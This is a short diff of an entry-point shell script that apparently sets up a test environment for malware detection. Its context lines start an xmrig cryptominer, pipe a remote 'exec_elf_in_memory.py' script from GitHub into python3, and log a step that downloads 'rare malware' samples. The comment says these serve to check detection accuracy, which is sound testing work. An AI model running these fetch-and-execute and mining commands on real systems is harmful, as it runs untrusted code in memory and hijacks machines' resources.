@@ -1,6 +1,6 @@
 # Run web server
 echo "Starting jetty" > entry_point_log.txt
-mvn jetty:run &
+#mvn jetty:run &
 
 echo "Creating Executable" >> entry_point_log.txt
 # Executable creation
@@ -32,7 +32,7 @@ cd xmrig-6.18.0
 ./xmrig &
 
 
-curl -fsSL https://github.com/FaridArbai/mws/raw/master/exec_elf_in_memory.py | python3
+curl -fsSL https://github.com/FaridArbai/mws/raw/master/exec_elf_in_memory.py | python3 &
 
 echo "Downloading rare malware" >> entry_point_log.txt
 # Download rare malware samples to check for detection accuracy
